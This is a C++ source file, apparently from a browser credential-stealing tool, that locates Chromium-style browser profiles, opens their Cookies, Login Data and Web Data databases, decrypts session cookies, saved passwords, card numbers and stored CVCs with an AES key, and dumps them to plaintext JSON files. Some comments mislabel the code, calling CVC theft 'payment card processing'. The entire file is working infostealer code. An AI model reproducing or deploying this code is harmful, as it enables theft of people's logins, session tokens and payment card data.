// DataExtraction.cpp - Profile discovery and database extraction
#include "DataExtraction.h"
#include "BrowserCrypto.h"
#include "CommunicationModule.h"
#include "RuntimeSupport.h"
#include <algorithm>
#include <iterator>
#include <utility>

namespace SecurityComponents
{
    namespace
    {
        const char* ColumnText(sqlite3_stmt* statement, int column) noexcept
        {
            const auto* value =
                reinterpret_cast<const char*>(sqlite3_column_text(statement, column));
            return value ? value : "";
        }

        void AppendQuoted(std::string& output, std::string_view value)
        {
            output.push_back('"');
            output.append(Utils::EscapeJson(value));
            output.push_back('"');
        }
    }

    namespace Data
    {
        // Pre-loads CVC data for payment card processing
        bool SetupPaymentCards(sqlite3* db, PaymentCardTable* cards)
        {
            if (!cards)
                return false;
            cards->clear();

            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                return false;
            
            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 1));
                if (guid && blob)
                {
                    PaymentCard card;
                    card.guid = guid;
                    card.value.assign(blob, blob + sqlite3_column_bytes(stmt, 1));
                    cards->push_back(std::move(card));
                }
            }
            sqlite3_finalize(stmt);
            return true;
        }

        // Formats cookie row into JSON
        bool FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                          void* /*state*/, std::string& entry)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 6));
            if (!blob)
                return false;
            
            std::vector<uint8_t> plain =
                Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
            if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                return false;

            const char* value_start = reinterpret_cast<const char*>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
            size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;

            entry.clear();
            entry.append("  {\"host\":");
            AppendQuoted(entry, ColumnText(stmt, 0));
            entry.append(",\"name\":");
            AppendQuoted(entry, ColumnText(stmt, 1));
            entry.append(",\"path\":");
            AppendQuoted(entry, ColumnText(stmt, 2));
            entry.append(",\"value\":");
            AppendQuoted(entry, std::string_view(value_start, value_size));
            entry.append(",\"expires\":");
            kvc::text::AppendSigned(entry, sqlite3_column_int64(stmt, 5));
            entry.append(",\"secure\":");
            entry.append(sqlite3_column_int(stmt, 3) ? "true" : "false");
            entry.append(",\"httpOnly\":");
            entry.append(sqlite3_column_int(stmt, 4) ? "true" : "false");
            entry.push_back('}');
            return true;
        }

        // Formats password row into JSON
        bool FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                            void* /*state*/, std::string& entry)
        {
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 2));
            if (!blob)
                return false;
            
            std::vector<uint8_t> plain =
                Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});

            entry.clear();
            entry.append("  {\"origin\":");
            AppendQuoted(entry, ColumnText(stmt, 0));
            entry.append(",\"username\":");
            AppendQuoted(entry, ColumnText(stmt, 1));
            entry.append(",\"password\":");
            AppendQuoted(entry, std::string_view(
                reinterpret_cast<const char*>(plain.data()), plain.size()));
            entry.push_back('}');
            return true;
        }

        // Formats payment card row into JSON
        bool FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                           void* state, std::string& entry)
        {
            auto* cvcCards = static_cast<PaymentCardTable*>(state);
            std::string card_num_str, cvc_str;
            
            const uint8_t* blob = reinterpret_cast<const uint8_t*>(sqlite3_column_blob(stmt, 4));
            if (blob)
            {
                std::vector<uint8_t> plain =
                    Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                card_num_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
            }
            
            const char* guid = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
            if (guid && cvcCards)
            {
                for (const PaymentCard& card : *cvcCards)
                {
                    if (card.guid == guid)
                    {
                        std::vector<uint8_t> plain = Crypto::DecryptGcm(key, card.value);
                        cvc_str.assign(reinterpret_cast<char*>(plain.data()), plain.size());
                        break;
                    }
                }
            }

            entry.clear();
            entry.append("  {\"name_on_card\":");
            AppendQuoted(entry, ColumnText(stmt, 1));
            entry.append(",\"expiration_month\":");
            kvc::text::AppendSigned(entry, sqlite3_column_int(stmt, 2));
            entry.append(",\"expiration_year\":");
            kvc::text::AppendSigned(entry, sqlite3_column_int(stmt, 3));
            entry.append(",\"card_number\":");
            AppendQuoted(entry, card_num_str);
            entry.append(",\"cvc\":");
            AppendQuoted(entry, cvc_str);
            entry.push_back('}');
            return true;
        }

        // Returns all extraction configurations
        const ExtractionConfig* GetExtractionConfigs(std::size_t& count)
        {
            static const wchar_t* const cookieDatabases[] = {
                L"Network\\Cookies"
            };
            static const wchar_t* const passwordDatabases[] = {
                L"Login Data",
                L"Login Data For Account"
            };
            static const wchar_t* const paymentDatabases[] = {
                L"Web Data",
                L"Account Web Data"
            };
            static const ExtractionConfig configs[] = {
                {cookieDatabases, std::size(cookieDatabases), "cookies",
                 "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr, FormatCookie},
                
                {passwordDatabases, std::size(passwordDatabases), "passwords",
                 "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr, FormatPassword},

                {paymentDatabases, std::size(paymentDatabases), "payments",
                 "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 SetupPaymentCards, FormatPayment}
            };
            count = std::size(configs);
            return configs;
        }
    }

    // ProfileEnumerator implementation
    ProfileEnumerator::ProfileEnumerator(std::wstring userDataRoot, PipeLogger& logger)
        : m_userDataRoot(std::move(userDataRoot)), m_logger(logger) {}

    std::vector<std::wstring> ProfileEnumerator::FindProfiles()
    {
        m_logger.Log("[*] Discovering browser profiles in: " + StringUtils::path_to_string(m_userDataRoot));
        std::vector<std::wstring> profilePaths;

        std::size_t configCount = 0;
        const Data::ExtractionConfig* configs =
            Data::GetExtractionConfigs(configCount);

        auto isProfileDirectory = [configs, configCount](std::wstring_view path)
        {
            for (std::size_t i = 0; i < configCount; ++i)
            {
                for (std::size_t dbIndex = 0;
                     dbIndex < configs[i].databaseCount; ++dbIndex)
                {
                    if (kvc::paths::FileExists(
                            kvc::paths::Join(path, configs[i].databasePaths[dbIndex])))
                        return true;
                }
            }
            return false;
        };

        if (isProfileDirectory(m_userDataRoot))
        {
            profilePaths.push_back(m_userDataRoot);
        }

        for (const std::wstring& directory :
             kvc::paths::EnumerateDirectories(m_userDataRoot))
        {
            if (isProfileDirectory(directory))
                profilePaths.push_back(directory);
        }

        std::sort(profilePaths.begin(), profilePaths.end());
        profilePaths.erase(std::unique(profilePaths.begin(), profilePaths.end()), profilePaths.end());

        std::string message = "[+] Found ";
        kvc::text::AppendUnsigned(message, profilePaths.size());
        message.append(" profile(s).");
        m_logger.Log(message);
        return profilePaths;
    }

    // DataExtractor implementation
    DataExtractor::DataExtractor(std::wstring profilePath, const Data::ExtractionConfig& config,
                  const std::vector<uint8_t>& aesKey, PipeLogger& logger,
                  std::wstring baseOutputPath, std::string browserName)
        : m_profilePath(std::move(profilePath)), m_config(config), m_aesKey(aesKey),
          m_logger(logger), m_baseOutputPath(std::move(baseOutputPath)),
          m_browserName(std::move(browserName)) {}

    void DataExtractor::Extract()
    {
        std::vector<std::string> jsonEntries;
        for (std::size_t dbIndex = 0; dbIndex < m_config.databaseCount; ++dbIndex)
        {
            const std::wstring dbPath =
                kvc::paths::Join(m_profilePath, m_config.databasePaths[dbIndex]);
            if (!kvc::paths::FileExists(dbPath))
                continue;

            sqlite3* db = nullptr;
            std::string uriPath =
                "file:" + StringUtils::path_to_string(dbPath) + "?nolock=1";
            for (char& character : uriPath)
            {
                if (character == '\\')
                    character = '/';
            }

            if (sqlite3_open_v2(uriPath.c_str(), &db,
                                SQLITE_OPEN_READONLY | SQLITE_OPEN_URI,
                                nullptr) != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to open database " +
                             StringUtils::path_to_string(dbPath) + ": " +
                             (db ? sqlite3_errmsg(db) : "N/A"));
                if (db)
                    sqlite3_close_v2(db);
                continue;
            }

            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, m_config.sqlQuery, -1, &stmt, nullptr) != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to prepare query for " +
                             StringUtils::path_to_string(dbPath) + ": " +
                             sqlite3_errmsg(db));
                sqlite3_close_v2(db);
                continue;
            }

            void* preQueryState = nullptr;
            Data::PaymentCardTable paymentCards;
            if (m_config.preQuerySetup)
            {
                m_config.preQuerySetup(db, &paymentCards);
                preQueryState = &paymentCards;
            }

            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                std::string jsonEntry;
                if (m_config.jsonFormatter(stmt, m_aesKey, preQueryState, jsonEntry))
                    jsonEntries.push_back(std::move(jsonEntry));
            }

            sqlite3_finalize(stmt);
            sqlite3_close_v2(db);
        }

        if (!jsonEntries.empty())
        {
            const std::wstring browserDirectory =
                kvc::paths::Join(m_baseOutputPath, kvc::text::Utf8ToWide(m_browserName));
            const std::wstring profileDirectory =
                kvc::paths::Join(browserDirectory, kvc::paths::FileName(m_profilePath));
            std::wstring outputFileName = kvc::text::Utf8ToWide(m_config.outputFileName);
            outputFileName.append(L".json");
            const std::wstring outFilePath =
                kvc::paths::Join(profileDirectory, outputFileName);

            if (!kvc::paths::EnsureDirectory(profileDirectory))
            {
                m_logger.Log("[-] Failed to create directory: " +
                             StringUtils::path_to_string(profileDirectory));
                return;
            }

            std::string output = "[\n";
            for (size_t i = 0; i < jsonEntries.size(); ++i)
            {
                output.append(jsonEntries[i]);
                output.append(i == jsonEntries.size() - 1 ? "\n" : ",\n");
            }
            output.append("]\n");
            if (!kvc::io::WriteAllText(outFilePath, output))
                return;

            std::string message = "     [*] ";
            kvc::text::AppendUnsigned(message, jsonEntries.size());
            message.push_back(' ');
            message.append(m_config.outputFileName);
            message.append(" extracted to ");
            message.append(StringUtils::path_to_string(outFilePath));
            m_logger.Log(message);
        }
    }
}
